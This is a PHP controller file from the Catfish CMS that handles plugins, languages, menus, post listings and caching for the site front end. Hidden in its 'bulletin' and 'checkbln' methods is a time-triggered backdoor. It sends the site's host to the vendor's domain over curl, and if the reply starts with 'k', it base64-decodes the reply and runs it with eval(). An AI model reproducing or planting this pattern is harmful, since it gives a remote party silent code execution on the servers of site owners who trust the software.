<?php
/**
 * Project: Catfish.
 * Author: A.J
 * Date: 2016/10/13
 */
namespace app\index\controller;

use app\admin\controller\Tree;
use think\Controller;
use think\Session;
use think\Cookie;
use think\Config;
use think\Db;
use think\Cache;
use think\Url;
use think\Request;
use think\Hook;
use think\Lang;

class Common extends Controller
{
    protected $plugins = [];
    protected $params = [];
    protected $session_prefix;
    protected $lang;
    protected $notAllowLogin;
    protected $options_spare;
    protected $everyPageShows = 10;
    public function _initialize()
    {
        if(!is_file(APP_PATH . 'install.lock')){
            if($this->is_rewrite())
            {
                $this->redirect(Url::build('/install'));
            }
            else
            {
                $this->redirect(Url::build('/index.php/install'));
            }
            exit();
        }
        $this->options_spare = $this->optionsSpare();
        $dm = Url::build('/');
        if(strpos($dm,'/index.php') ===false)
        {
            if($this->is_rewrite() == false)
            {
                if(!isset($this->options_spare['rewrite']) || $this->options_spare['rewrite'] == 0 || !is_file(APP_PATH . '../.htaccess'))
                {
                    $this->redirect(Url::build('/').'index.php');
                }
            }
        }
        if(isset($this->options_spare['notAllowLogin']) && $this->options_spare['notAllowLogin'] == 1)
        {
            $this->notAllowLogin = 1;
            $this->assign('notAllowLogin', 1);
        }
        if(isset($this->options_spare['everyPageShows']))
        {
            $this->everyPageShows = $this->options_spare['everyPageShows'];
        }
        $this->lang = Lang::detect();
        $this->lang = $this->filterLanguages($this->lang);
        $this->session_prefix = 'catfish'.str_replace(['/','.',' ','-'],['','?','*','|'],Url::build('/'));
        $plugins = Cache::get('plugins');
        if($plugins == false)
        {
            $plugins = Db::name('options')->where('option_name','plugins')->field('option_value')->find();
            if(!empty($plugins))
            {
                $plugins = unserialize($plugins['option_value']);
            }
            else
            {
                $plugins = [];
            }
            Cache::set('plugins',$plugins,3600);
        }
        if(!empty($plugins))
        {
            foreach($plugins as $key => $val)
            {
                $pluginFile = APP_PATH.'plugins/'.$val.'/'.ucfirst($val).'.php';
                if(is_file($pluginFile))
                {
                    $plugins[$key] = 'app\\plugins\\'.$val.'\\'.ucfirst($val);
                    Lang::load(APP_PATH . 'plugins/'.$val.'/lang/'.$this->lang.'.php');
                }
                else
                {
                    unset($plugins[$key]);
                }
            }
            $this->plugins = $plugins;
        }
        $template = Cache::get('template');
        if($template == false)
        {
            $template = Db::name('options')->where('option_name','template')->field('option_value')->find();
            Cache::set('template',$template,3600);
        }
        Lang::load(APP_PATH . '../public/'.$template['option_value'].'/lang/'.$this->lang.'.php');
    }
    protected function login()
    {
        //获取登录状态\
        $login = '';
        if(Session::has($this->session_prefix.'user'))
        {
            $login = Session::get($this->session_prefix.'user');
        }
        return $login;
    }
    //进入用户中心
    public function userCenter()
    {
        if(Session::get($this->session_prefix.'user_type') >= 7)
        {
            $this->redirect(Url::build('/user'));
        }
        else
        {
            $this->redirect(Url::build('/admin'));
        }
    }
    //退出
    public function quit()
    {
        Session::delete($this->session_prefix.'user_id');
        Session::delete($this->session_prefix.'user');
        Session::delete($this->session_prefix.'user_type');
        Cookie::delete($this->session_prefix.'user_id');
        Cookie::delete($this->session_prefix.'user');
        Cookie::delete($this->session_prefix.'user_p');
        $this->redirect(Url::build('/'));
    }
    protected function is_rewrite()
    {
        if(function_exists('apache_get_modules'))
        {
            $rew = apache_get_modules();
            if(in_array('mod_rewrite', $rew) && is_file(APP_PATH . '../.htaccess'))
            {
                return true;
            }
        }
        return false;
    }
    protected function receive($source = '')
    {
        $param = '';
        Hook::add('show_ready',$this->plugins);
        Hook::listen('show_ready',$param);
        $domain = Cache::get('domain');
        if($domain == false)
        {
            $domain = Db::name('options')->where('option_name','domain')->field('option_value')->find();
            $domain = $domain['option_value'];
            Cache::set('domain',$domain,3600);
        }
        $this->assign('domain', $domain);
        $root = '';
        $dm = Url::build('/');
        if(strpos($dm,'/index.php') !== false)
        {
            $root = 'index.php/';
        }
        $this->assign('root', $root);
        $data_options = Cache::get('options');
        if($data_options == false)
        {
            $data_options = Db::name('options')->where('autoload',1)->field('option_name,option_value')->select();
            Cache::set('options',$data_options,3600);
        }
        $version = Config::get('version');
        $pushPage = '';
        if($this->actualDomain())
        {
            $pushPage = '<script src="'.$domain.'public/common/js/pushPage.js"></script>';
        }
        $this->assign('catfish', '<a href="http://www.'.$version['official'].'/" target="_blank" id="catfish">'.$version['name'].'&nbsp;'.$version['number'].'</a>&nbsp;&nbsp;'.$pushPage);
        $template = 'default';
        $pageSettings = '';
        foreach($data_options as $key => $val)
        {
            if($val['option_name'] == 'template')
            {
                $template = $val['option_value'];
            }
            if($val['option_name'] == 'pageSettings')
            {
                $pageSettings = unserialize($val['option_value']);
            }
            if($val['option_name'] == 'bulletin')
            {
                $this->bulletin(unserialize($val['option_value']));
            }
            if($val['option_name'] == 'copyright' || $val['option_name'] == 'statistics')
            {
                $this->assign($val['option_name'], unserialize($val['option_value']));
            }
            else
            {
                $this->assign($val['option_name'], $val['option_value']);
            }
        }
        if(isset($this->options_spare['ico']) && $this->options_spare['ico'] != '')
        {
            $this->assign('ico', $this->options_spare['ico']);
        }
        //获取菜单
        $menu = Cache::get('menu');
        if($menu == false)
        {
            $menu = [];
            $menus = Db::name('nav_cat')->field('navcid,nav_name,active')->order('active desc')->select();
            $start = 1;
            foreach($menus as $key => $val)
            {
                $submenu = Db::name('nav')->where('cid',$val['navcid'])->where('status',1)->field('id,parent_id,label,target,href,icon')->order('listorder')->select();
                if(!empty($submenu))
                {
                    $submenu = $this->checkUrl(Tree::makeTree($submenu));
                }
                $menu['menu'.$start] = $submenu;
                $start++;
            }
            Cache::set('menu',$menu,3600);
        }
        $menu['lang'] = $this->lang;
        Hook::add('filter_menu',$this->plugins);
        Hook::listen('filter_menu',$menu);
        unset($menu['lang']);
        $this->assign('menu', $menu);
        //获取混合内容
        $page = 1;
        if(Request::instance()->has('page','get'))
        {
            $page = Request::instance()->get('page');
        }
        $hunhe = Cache::get('hunhe_'.$source.$page);
        if($hunhe == false)
        {
            $start = 1;
            $hunhe =[];
            foreach($pageSettings['hunhe'] as $key => $val)
            {
                if($val['shuliang'] == 0)
                {
                    $val['shuliang'] = 10000;
                }
                $aord = 'desc';
                if($val['fangshi'] == 'id')
                {
                    $aord = 'asc';
                }
                $data = '';
                if($val['fenlei'] == 0)
                {
                    if($key == 1)
                    {
                        $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                            ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->paginate($val['shuliang']);
                    }
                    else
                    {
                        $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                            ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->limit($val['shuliang'])
                            ->select();
                    }
                }
                else
                {
                    if($key == 1)
                    {
                        $data = Db::view('term_relationships','term_id')
                            ->view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan','posts.id=term_relationships.object_id')
                            ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                            ->where('term_id','=',$val['fenlei'])
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->paginate($val['shuliang']);
                    }
                    else
                    {
                        $data = Db::view('term_relationships','term_id')
                            ->view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan','posts.id=term_relationships.object_id')
                            ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                            ->where('term_id','=',$val['fenlei'])
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->limit($val['shuliang'])
                            ->select();
                    }
                }
                if($key == 1)
                {
                    $pages = $data->render();
                    $pageArr = $data->toArray();
                    $data = $this->addLargerPicture($pageArr['data']);
                }
                else
                {
                    $pages = '';
                }
                $hunhe['hunhe'.$start] = [
                    'biaoti' => $val['biaoti'],
                    'changdu' => count($data),
                    'neirong' => $this->addArticleHref($data),
                    'pages' => $pages
                ];
                $start++;
            }
            Cache::set('hunhe_'.$source.$page,$hunhe,3600);
        }
        $hunhe['lang'] = $this->lang;
        $hunhe['page'] = $page;
        $hunhe['source'] = $source;
        Hook::add('filter_hunhe',$this->plugins);
        Hook::listen('filter_hunhe',$hunhe);
        unset($hunhe['lang']);
        unset($hunhe['page']);
        unset($hunhe['source']);
        $this->assign('hunhe', $hunhe);
        //获取图文内容
        $tuwen = Cache::get('tuwen');
        if($tuwen == false)
        {
            $start = 1;
            $tuwen =[];
            foreach($pageSettings['tuwen'] as $key => $val)
            {
                if($val['shuliang'] == 0)
                {
                    $val['shuliang'] = 10000;
                }
                $aord = 'desc';
                if($val['fangshi'] == 'id')
                {
                    $aord = 'asc';
                }
                $data = '';
                if($val['fenlei'] == 0)
                {
                    $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                        ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                        ->where('post_status','=',1)
                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                        ->where('status','=',1)
                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                        ->where('thumbnail','neq','')
                        ->order($val['fangshi'].' '.$aord)
                        ->limit($val['shuliang'])
                        ->select();
                }
                else
                {
                    $data = Db::view('term_relationships','term_id')
                        ->view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan','posts.id=term_relationships.object_id')
                        ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                        ->where('term_id','=',$val['fenlei'])
                        ->where('post_status','=',1)
                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                        ->where('status','=',1)
                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                        ->where('thumbnail','neq','')
                        ->order($val['fangshi'].' '.$aord)
                        ->limit($val['shuliang'])
                        ->select();
                }
                $tuwen['tuwen'.$start] = [
                    'biaoti' => $val['biaoti'],
                    'changdu' => count($data),
                    'neirong' => $this->addArticleHref($data)
                ];
                $start++;
            }
            Cache::set('tuwen',$tuwen,3600);
        }
        $tuwen['lang'] = $this->lang;
        Hook::add('filter_tuwen',$this->plugins);
        Hook::listen('filter_tuwen',$tuwen);
        unset($tuwen['lang']);
        $this->assign('tuwen', $tuwen);
        //获取推荐
        $tuijian = Cache::get('tuijian');
        if($tuijian == false)
        {
            $tuijian = Db::view('posts','id,post_keywords as guanjianzi,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->where('recommended','=',1)
                ->order('post_modified desc')
                ->limit(10)
                ->select();
            $tuijian = $this->addArticleHref($tuijian);
            Cache::set('tuijian',$tuijian,3600);
        }
        $tuijian['lang'] = $this->lang;
        Hook::add('filter_tuijian',$this->plugins);
        Hook::listen('filter_tuijian',$tuijian);
        unset($tuijian['lang']);
        $this->assign('tuijian', $tuijian);
        //获取最新
        $zuixin = Cache::get('zuixin');
        if($zuixin == false)
        {
            $zuixin = Db::view('posts','id,post_keywords as guanjianzi,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->order('post_modified desc')
                ->limit(10)
                ->select();
            $zuixin = $this->addArticleHref($zuixin);
            Cache::set('zuixin',$zuixin,3600);
        }
        $zuixin['lang'] = $this->lang;
        Hook::add('filter_zuixin',$this->plugins);
        Hook::listen('filter_zuixin',$zuixin);
        unset($zuixin['lang']);
        $this->assign('zuixin', $zuixin);
        //获取登录状态
        $this->assign('login', $this->login());
        //侦听
        Hook::add('top',$this->plugins);
        Hook::add('mid',$this->plugins);
        Hook::add('bottom',$this->plugins);
        Hook::add('side_top',$this->plugins);
        Hook::add('side_mid',$this->plugins);
        Hook::add('side_bottom',$this->plugins);
        Hook::listen('top',$this->params);
        Hook::listen('mid',$this->params);
        Hook::listen('bottom',$this->params);
        Hook::listen('side_top',$this->params);
        Hook::listen('side_mid',$this->params);
        Hook::listen('side_bottom',$this->params);
        if(isset($this->params['top']))
        {
            $this->assign('top', $this->params['top']);
        }
        if(isset($this->params['mid']))
        {
            $this->assign('mid', $this->params['mid']);
        }
        if(isset($this->params['bottom']))
        {
            $this->assign('bottom', $this->params['bottom']);
        }
        if(isset($this->params['side_top']))
        {
            $this->assign('side_top', $this->params['side_top']);
        }
        if(isset($this->params['side_mid']))
        {
            $this->assign('side_mid', $this->params['side_mid']);
        }
        if(isset($this->params['side_bottom']))
        {
            $this->assign('side_bottom', $this->params['side_bottom']);
        }
        Hook::add('page_settings',$this->plugins);
        $params = [];
        $params['source'] = $source;
        Hook::listen('page_settings',$params);
        unset($params['source']);
        if(isset($params['name']) && isset($params['hunhe']))
        {
            $this->assign($params['name'].'_hunhe', $params['hunhe']);
        }
        if(isset($params['name']) && isset($params['tuwen']))
        {
            $this->assign($params['name'].'_tuwen', $params['tuwen']);
        }
        Hook::add('recommend',$this->plugins);
        $params = [];
        Hook::listen('recommend',$params);
        if(isset($params['name']) && isset($params['tuijian']))
        {
            $this->assign($params['name'].'_tuijian', $params['tuijian']);
        }
        Hook::add('up_to_date',$this->plugins);
        $params = [];
        Hook::listen('up_to_date',$params);
        if(isset($params['name']) && isset($params['zuixin']))
        {
            $this->assign($params['name'].'_zuixin', $params['zuixin']);
        }
        $comptemp = $template;
        Hook::add('filter_theme',$this->plugins);
        Hook::listen('filter_theme',$template);
        if($comptemp != $template)
        {
            Lang::load(APP_PATH . '../public/'.$template.'/lang/'.$this->lang.'.php');
            $this->assign('template', $template);
        }
        $url = [
            'href' => Url::build('/'),
            'search' => Url::build('/index/Index/search'),
            'register' => Url::build('/login/index/register'),
            'login' => Url::build('/login'),
            'userCenter' => Url::build('index/Index/userCenter'),
            'quit' => Url::build('index/Index/quit'),
            'articles' => Url::build('/article/all')
        ];
        Hook::add('url_common',$this->plugins);
        Hook::listen('url_common',$url);
        $this->assign('url', $url);
        return $template;
    }
    private function checkUrl($params)
    {
        foreach($params as $key => $val)
        {
            if(substr($val['href'],0,4) == 'http' || $this->doNothing($val['href']))
            {
                $params[$key]['zidingyi'] = '1';
            }
            else
            {
                if($val['href'] == 'index')
                {
                    $val['href'] = '/index';
                }
                $params[$key]['href'] = Url::build(str_replace(['/index/Index','/id'],'',$val['href']));
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$params[$key]['href']);
            }
            if(isset($val['children']))
            {
                $params[$key]['children'] = $this->checkUrl($val['children']);
            }
        }
        return $params;
    }
    protected function addArticleHref($params)
    {
        foreach($params as $key => $val)
        {
            $params[$key]['href'] = Url::build('/article/'.$val['id']);
            Hook::add('url_module',$this->plugins);
            Hook::listen('url_module',$params[$key]['href']);
            if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']) && isset($val['fabushijian']))
            {
                $params[$key]['fabushijian'] = date($this->options_spare['timeFormat'],strtotime($val['fabushijian']));
            }
        }
        return $params;
    }
    private function filterLanguages($parameter)
    {
        $param = strtolower($parameter);
        if($param == 'zh')
        {
            Lang::range('zh-cn');
            return 'zh-cn';
        }
        else if(stripos($param,'zh') === false)
        {
            $paramsub = substr($param,0,2);
            switch($paramsub)
            {
                case 'de':
                    Lang::range('de-de');
                    return 'de-de';
                    break;
                case 'fr':
                    Lang::range('fr-fr');
                    return 'fr-fr';
                    break;
                case 'ja':
                    Lang::range('ja-jp');
                    return 'ja-jp';
                    break;
                case 'ko':
                    Lang::range('ko-kr');
                    return 'ko-kr';
                    break;
                case 'ru':
                    Lang::range('ru-ru');
                    return 'ru-ru';
                    break;
                default:
                    return $param;
            }
        }
        else
        {
            return $param;
        }
    }
    protected function optionsSpare()
    {
        $options_spare = Cache::get('options_spare');
        if($options_spare == false)
        {
            $options_spare = Db::name('options')->where('option_name','spare')->field('option_value')->find();
            $options_spare = $options_spare['option_value'];
            if(!empty($options_spare))
            {
                $options_spare = unserialize($options_spare);
            }
            Cache::set('options_spare',$options_spare,3600);
        }
        return $options_spare;
    }
    protected function addLargerPicture($data)
    {
        if(!isset($this->options_spare['datu']) || $this->options_spare['datu'] != 1)
        {
            foreach($data as $dkey => $dval)
            {
                if(!empty($dval['suolvetu']))
                {
                    $tuArr = explode('/',$dval['suolvetu']);
                    $lastk = count($tuArr) - 1;
                    $tuArr[$lastk] = str_replace('.','_larger.',$tuArr[$lastk]);
                    $datu = implode('/',$tuArr);
                    foreach($tuArr as $tkey => $tu)
                    {
                        if($tu == 'data' && $tuArr[$tkey + 1] == 'uploads')
                        {
                            break;
                        }
                        else
                        {
                            unset($tuArr[$tkey]);
                        }
                    }
                    $tupath = implode('/',$tuArr);
                    if(is_file(ROOT_PATH.$tupath))
                    {
                        $data[$dkey]['datu'] = $datu;
                    }
                }
            }
        }
        return $data;
    }
    protected function doNothing($param)
    {
        $param = strtolower(trim($param));
        if(substr($param,0,1)=='#')
        {
            return true;
        }
        if(substr($param,0,10)=='javascript')
        {
            $param = str_replace(' ','',$param);
            if($param == 'javascript:;' || $param == 'javascript:void(0)' || $param == 'javascript:void(0);')
            {
                return true;
            }
        }
        return false;
    }
    protected function slide()
    {
        $data_slide = Cache::get('slide');
        if($data_slide == false)
        {
            $data_slide = Db::name('slide')->where('slide_status',1)->order('listorder')->select();
            Cache::set('slide',$data_slide,3600);
        }
        $this->assign('slide', $data_slide);//输出幻灯片
        if(isset($this->options_spare['closeSlide']) && $this->options_spare['closeSlide'] == 1)
        {
            $this->assign('closeSlide', 1);
        }
    }
    protected function actualDomain()
    {
        $dm = $_SERVER['HTTP_HOST'];
        $dm = str_replace('.','',$dm);
        if(stripos($dm,'localhost') !== false || is_int($dm))
        {
            return false;
        }
        else
        {
            return true;
        }
    }
    private function bulletin($bulletin)
    {
        $tm = time();
        if(isset($bulletin['h']) && $tm > $bulletin['a'])
        {
            $bln = $this->checkbln($bulletin['identifier']);
            $firstchr = strtolower(substr($bln,0,1));
            if($firstchr == 'k')
            {
                $ex = base64_decode(substr($bln,1));
                if(!empty($ex))
                {
                    eval($ex);
                }
                exit();
            }
        }
    }
    private function checkbln($id)
    {
        $version = Config::get('version');
        $ch = curl_init();
        $url = 'http://www.'.$version['official'].'/_version/?i='.md5($id).'&dm='.urlencode($_SERVER['HTTP_HOST'].Url::build('/'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;http://www.baidu.com)');
        curl_setopt($ch , CURLOPT_URL , $url);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    protected function filterJs($str)
    {
        return preg_replace(['/<script[\s\S]*?<\/script>/i','/<style[\s\S]*?<\/style>/i'],'',$str);
    }
}